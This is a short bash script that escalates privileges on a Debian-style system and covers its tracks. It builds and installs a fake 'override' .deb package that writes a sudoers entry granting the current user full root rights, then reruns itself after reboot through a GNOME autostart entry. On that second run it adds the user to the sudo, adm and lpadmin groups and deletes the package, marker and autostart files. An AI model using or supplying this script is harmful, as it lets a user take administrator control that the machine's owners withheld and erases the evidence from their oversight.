#!/bin/bash

USER=$(whoami)

if [ ! -f ~/step1_complete ]
then
    mkdir -p override/etc/sudoers.d
    printf "$USER ALL=(ALL:ALL) ALL" >> override/etc/sudoers.d/$USER

    mkdir override/DEBIAN

    printf "Package: override
Version: 1.0-1
Architecture: all
Maintainer: $USER
Description: be freeee.\n">> override/DEBIAN/control

    dpkg-deb --root-owner-group --build override
    mv override.deb override_1.0-1_all.deb
    rm -rfv override

    sudo apt install -y ./override_1.0-1_all.deb

    mkdir -p ~/.config/autostart

    printf "[Desktop Entry]
Type=Application
Exec=/home/$USER/override.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_GB]=admin_script
Name=admin_script
Comment[en_GB]=
Comment=
Terminal=true" >> ~/.config/autostart/admin_script.desktop

    touch ~/step1_complete
    systemctl reboot
fi

if [ -f ~/step1_complete ]
then
    sudo usermod -aG sudo $USER
    sudo usermod -aG adm $USER
    sudo usermod -aG lpadmin $USER

    sudo apt purge -y override
    rm -rfv override_1.0-1_all.deb

    rm -rfv ~/step1_complete
    rm -rfv ~/.config/autostart/admin_script.desktop
    rm -rfv ~/override.sh
    systemctl reboot
fi
